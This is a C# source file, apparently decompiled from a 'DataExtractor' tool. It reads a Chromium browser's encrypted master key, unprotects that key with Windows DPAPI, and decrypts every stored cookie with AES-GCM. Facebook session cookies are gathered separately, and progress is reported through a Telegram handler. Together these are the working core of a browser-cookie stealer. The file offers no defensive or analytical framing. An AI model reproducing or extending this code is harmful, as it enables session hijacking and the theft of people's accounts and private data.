using System;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Dapper;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Handlers;
using Microsoft.Data.Sqlite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace DataExtractor.Core.Models.Browsers.Childs;

public class ChromiumBrowser : MyBrowser
{
	private class MyConnection : SqliteConnection
	{
		public MyConnection(string filePath)
			: base("Data Source=" + filePath)
		{
		}

		public override ValueTask DisposeAsync()
		{
			return base.DisposeAsync();
		}

		protected override void Dispose(bool disposing)
		{
			base.Dispose(disposing);
		}
	}

	private byte[] _privateKey;

	private readonly string _keyPath;

	public ChromiumBrowser(string keyPath)
	{
		_keyPath = keyPath;
	}

	protected override void Scan(BrowserProfile profile, TelegramHandler telegramHandler)
	{
		byte[] key = GetKey();
		GetData(profile, key, telegramHandler);
	}

	private void GetData(BrowserProfile profile, byte[] key, TelegramHandler telegramHandler)
	{
		GetCookie(profile, key, telegramHandler);
		GetExtensionData(profile);
	}

	private void GetExtensionData(BrowserProfile profile)
	{
		string text = Path.Combine(profile.ProfilePath, "Sync Extension Settings");
		if (Directory.Exists(text))
		{
			profile.ExtensionData = text;
		}
	}

	private void GetCookie(BrowserProfile profile, byte[] key, TelegramHandler telegramHandler)
	{
		telegramHandler.Log("Get " + profile.CookiePath);
		StringBuilder stringBuilder = new StringBuilder();
		SqliteConnection connection = GetConnection(profile, telegramHandler);
		if (connection == null)
		{
			return;
		}
		try
		{
			using (IDataReader dataReader = connection.ExecuteReader("select name, path, expires_utc, is_secure, is_httponly, host_key, encrypted_value  from cookies"))
			{
				while (dataReader.Read())
				{
					try
					{
						string realValue = GetRealValue(GetBytes(dataReader, 6), key);
						string @string = dataReader.GetString(0);
						string string2 = dataReader.GetString(1);
						long expiry = dataReader.GetInt64(2) / 1000;
						bool boolean = dataReader.GetBoolean(3);
						bool boolean2 = dataReader.GetBoolean(4);
						string string3 = dataReader.GetString(5);
						if (string3.Contains("facebook"))
						{
							stringBuilder.Append(@string + "=" + realValue + ";");
						}
						CookieData item = new CookieData
						{
							Name = @string,
							Value = realValue,
							Host = string3,
							Path = string2,
							Expiry = expiry,
							IsSecure = boolean,
							IsHttpOnly = boolean2
						};
						profile.Cookies.Add(item);
					}
					catch (Exception)
					{
					}
				}
			}
			profile.FbCookies = stringBuilder.ToString();
		}
		catch (Exception ex2)
		{
			telegramHandler.Log(ex2.ToString());
		}
	}

	private string GetRealValue(byte[] encryptByte, byte[] key)
	{
		return DecryptWithKey(encryptByte, key, 3);
	}

	private string DecryptWithKey(byte[] message, byte[] key, int nonSecretPayloadLength)
	{
		if (key == null || key.Length != 32)
		{
			throw new ArgumentException($"Key needs to be {256} bit!", "key");
		}
		if (message == null || message.Length == 0)
		{
			throw new ArgumentException("Message required!", "message");
		}
		using MemoryStream input = new MemoryStream(message);
		using BinaryReader binaryReader = new BinaryReader(input);
		byte[] array = binaryReader.ReadBytes(nonSecretPayloadLength);
		byte[] nonce = binaryReader.ReadBytes(12);
		GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
		AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, nonce);
		gcmBlockCipher.Init(forEncryption: false, parameters);
		byte[] array2 = binaryReader.ReadBytes(message.Length);
		byte[] array3 = new byte[gcmBlockCipher.GetOutputSize(array2.Length)];
		try
		{
			int outOff = gcmBlockCipher.ProcessBytes(array2, 0, array2.Length, array3, 0);
			gcmBlockCipher.DoFinal(array3, outOff);
		}
		catch (InvalidCipherTextException)
		{
			return null;
		}
		return Encoding.Default.GetString(array3);
	}

	private byte[] GetBytes(IDataReader reader, int columnIndex)
	{
		byte[] array = new byte[2048];
		long num = 0L;
		using MemoryStream memoryStream = new MemoryStream();
		long bytes;
		while ((bytes = reader.GetBytes(columnIndex, num, array, 0, array.Length)) > 0)
		{
			memoryStream.Write(array, 0, (int)bytes);
			num += bytes;
		}
		return memoryStream.ToArray();
	}

	private SqliteConnection GetConnection(BrowserProfile profile, TelegramHandler telegramHandler)
	{
		if (!File.Exists(profile.CookiePath))
		{
			telegramHandler.Log("No : " + profile.CookiePath);
			return null;
		}
		try
		{
			SqliteConnection sqliteConnection = new SqliteConnection("Data Source=" + profile.CookiePath);
			sqliteConnection.Open();
			return sqliteConnection;
		}
		catch (Exception ex)
		{
			telegramHandler.Log(ex.ToString());
			try
			{
				string text = Path.Combine(Path.GetTempPath(), "temp.txt");
				File.Copy(profile.CookiePath, text, overwrite: true);
				SqliteConnection sqliteConnection2 = new MyConnection(text);
				sqliteConnection2.Open();
				return sqliteConnection2;
			}
			catch
			{
				return null;
			}
		}
	}

	public byte[] GetKey()
	{
		if (_privateKey != null)
		{
			return _privateKey;
		}
		try
		{
			string html = File.ReadAllText(_keyPath);
			html = html.CutString("encrypted_key\":\"", "\"");
			if (string.IsNullOrEmpty(html))
			{
				return null;
			}
			_privateKey = ProtectedData.Unprotect(Convert.FromBase64String(html).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine);
			return _privateKey;
		}
		catch (Exception)
		{
			return null;
		}
	}
}
